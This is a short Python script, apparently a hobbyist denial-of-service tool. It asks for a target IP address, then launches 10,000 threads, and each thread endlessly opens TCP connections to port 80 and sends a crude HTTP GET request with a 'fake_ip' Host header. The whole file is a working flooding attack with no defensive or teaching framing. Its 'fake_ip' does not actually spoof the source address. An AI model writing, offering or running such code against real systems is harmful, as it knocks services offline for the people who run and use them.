import socket
import threading
import os
target = input("Type in the target ip: ")
port = 80
fake_ip = "192.168.0.3"


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target+"HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()


for i in range(10000):
    thread = threading.Thread(target=attack)
    thread.start()
